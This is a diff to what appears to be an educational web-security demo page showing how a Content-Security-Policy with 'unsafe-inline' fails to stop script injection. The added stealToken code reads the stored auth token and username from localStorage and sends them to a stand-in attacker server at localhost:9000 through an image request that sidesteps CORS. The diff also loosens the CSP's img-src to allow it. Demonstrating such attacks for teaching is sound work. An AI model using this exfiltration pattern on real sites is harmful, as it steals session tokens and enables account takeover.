@@ -23,7 +23,7 @@
   ══════════════════════════════════════════════════ -->
 
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;">
+        content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' http://localhost:9000;">
 
   <link rel="stylesheet" href="shared.css">
   <style>
@@ -253,15 +253,7 @@ document.getElementById(<span class="str">'renderZone'</span>).<span class="hi-r
     </div>
 
     <div class="panel full-width">
-      <div class="panel-header">
-        <h3>📋 Console Log</h3>
-        <span class="ph-badge badge-warn">No CSP Violations Expected</span>
-      </div>
-      <div class="panel-body">
-        <div class="console-box">
-          <div class="cb-title">Browser Console — Notice: No "Refused to execute inline script" messages</div>
-          <div id="logContainer"></div>
-        </div>
+        
       </div>
     </div>
 
@@ -312,13 +304,17 @@ document.getElementById(<span class="str">'renderZone'</span>).<span class="hi-r
   function stealToken() {
     const stolen = localStorage.getItem('auth_token');
     const user = localStorage.getItem('auth_user');
+
+    // Exfiltrate to attacker server — Image request bypasses CORS
+    new Image().src = 'http://localhost:9000/steal?user=' + encodeURIComponent(user) + '&token=' + encodeURIComponent(stolen);
+
     document.getElementById('alertBody').innerHTML =
       '<span style="color:#ffb830">⚠ CSP was active but "unsafe-inline" bypassed it!</span><br><br>' +
       '<span style="color:#ff8fa3">Victim:</span> ' + user + '<br>' +
       '<span style="color:#ff8fa3">Token:</span> <span style="color:var(--warn)">' + stolen.substring(0,80) + '...</span><br><br>' +
-      '<span style="color:#5a5d72">Exfiltrated → attacker.com/steal?t=' + stolen.substring(0,20) + '...</span>';
+      '<span style="color:#5a5d72">Exfiltrated → localhost:9000/steal?user=' + encodeURIComponent(user) + '&token=' + stolen.substring(0,20) + '...</span>';
     document.getElementById('alertBanner').style.display = 'block';
-    addLog('🚨 TOKEN STOLEN despite CSP! unsafe-inline = no protection', 'err');
+    addLog('🚨 TOKEN STOLEN + SENT TO ATTACKER SERVER! Check localhost:9000/view', 'err');
   }
 
   function logout() { localStorage.clear(); window.location.href = 'login.html'; }
